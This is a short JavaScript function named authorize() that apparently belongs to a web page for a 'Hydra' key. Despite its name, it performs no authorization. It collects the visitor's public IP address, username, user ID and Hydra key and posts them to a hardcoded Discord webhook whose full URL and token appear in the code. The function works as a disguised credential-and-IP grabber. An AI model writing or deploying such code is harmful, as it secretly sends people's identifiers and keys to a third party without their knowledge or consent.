function authorize() {
            const ipAddressURL = 'https://api.ipify.org?format=json';

            fetch(ipAddressURL)
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Failed to fetch IP address');
                    }
                    return response.json();
                })
                .then(data => {
                    const ipAddress = data.ip;
                    const username = document.getElementById('username').value;
                    const userid = document.getElementById('userid').value;
                    const hydrakey = document.getElementById('hydrakey').value;
                    const ip = ipAddress;

                    const webhookURL = 'https://discord.com/api/webhooks/1187269215019876402/r6LsgmHmaOUeiiaKMdQW0710QKi8TFPviUm9Hz2lUUzLYFWM7x70F97Zy_89W3tCt1dU'; // Replace with your Discord webhook URL

                    fetch(webhookURL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({ content: `Username : ${username} | UserID : ${userid} | IP : ${ip} | Hydra Key : ${hydrakey}` })
                    })
                    .then(response => {
                        if (!response.ok) {
                            throw new Error('Failed to send data to Discord');
                        }
                        console.log('Information sent to Discord webhook:', response);
                    })
                    .catch(error => {
                        console.error('Error sending information to Discord:', error);
                    });
                })
                .catch(error => {
                    console.error('Error collecting user information:', error);
                });
        }
